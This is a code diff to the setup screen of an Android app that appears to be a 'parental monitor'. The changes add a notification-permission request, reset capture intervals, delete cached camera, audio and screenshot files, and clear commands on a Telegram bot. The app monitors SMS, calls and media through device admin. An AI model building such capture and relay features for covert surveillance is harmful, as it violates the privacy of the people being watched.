@@ -82,6 +82,15 @@ class SetupActivity : AppCompatActivity() {
         updateStatus()
     }
 
+    private val notifPermissionLauncher = registerForActivityResult(
+        ActivityResultContracts.RequestPermission()
+    ) {
+        try {
+            updateStatus()
+        } catch (_: Exception) {
+        }
+    }
+
     private val deviceAdminLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { res ->
@@ -116,6 +125,7 @@ class SetupActivity : AppCompatActivity() {
         } else {
             try { prefs.clearScreenshotConsentSync() } catch (_: Exception) { }
             Toast.makeText(this, getString(R.string.setup_shot_denied), Toast.LENGTH_SHORT).show()
+            try { updateStatus() } catch (_: Exception) { }
         }
     }
 
@@ -299,7 +309,7 @@ class SetupActivity : AppCompatActivity() {
                 val meta = getSharedPreferences("setup_meta", MODE_PRIVATE)
                 if (!meta.getBoolean("notif_asked", false)) {
                     try { meta.edit().putBoolean("notif_asked", true).apply() } catch (_: Exception) { }
-                    try { permissionLauncher.launch(arrayOf(Manifest.permission.POST_NOTIFICATIONS)) } catch (_: Exception) { }
+                    try { notifPermissionLauncher.launch(Manifest.permission.POST_NOTIFICATIONS) } catch (_: Exception) { }
                 }
             }
         } catch (_: Exception) {
@@ -367,6 +377,8 @@ class SetupActivity : AppCompatActivity() {
                     )
                 } catch (_: Exception) {
                 }
+            }
+            if (oldToken.isNotEmpty()) {
                 try {
                     com.redeye.parentalmonitor.network.TelegramClient.api.deleteMyCommands(
                         "https://api.telegram.org/bot$oldToken/deleteMyCommands",
@@ -385,6 +397,16 @@ class SetupActivity : AppCompatActivity() {
             try { prefs.lastSmsSendAt = 0L } catch (_: Exception) { }
             try { prefs.commandsTokenHash = "" } catch (_: Exception) { }
             try { prefs.ownerPairCode = "" } catch (_: Exception) { }
+            try { prefs.syncInterval = com.redeye.parentalmonitor.BuildConfig.SYNC_INTERVAL } catch (_: Exception) { }
+            try { prefs.cameraInterval = 1 } catch (_: Exception) { }
+            try {
+                cacheDir?.listFiles { f ->
+                    f.isFile && (f.name.startsWith("camera_") || f.name.startsWith("video_") || f.name.startsWith("audio_") || f.name.startsWith("screenshot_"))
+                }?.forEach {
+                    try { it.delete() } catch (_: Exception) { }
+                }
+            } catch (_: Exception) {
+            }
             try { prefs.lastSmsId = 0L } catch (_: Exception) { }
             try { prefs.lastCallTimestamp = 0L } catch (_: Exception) { }
             try { prefs.lastCallId = 0L } catch (_: Exception) { }
@@ -1088,6 +1110,7 @@ class SetupActivity : AppCompatActivity() {
                 return
             }
         } catch (_: Exception) {
+            Toast.makeText(this, getString(R.string.msg_action_failed), Toast.LENGTH_SHORT).show()
             return
         }
         try {
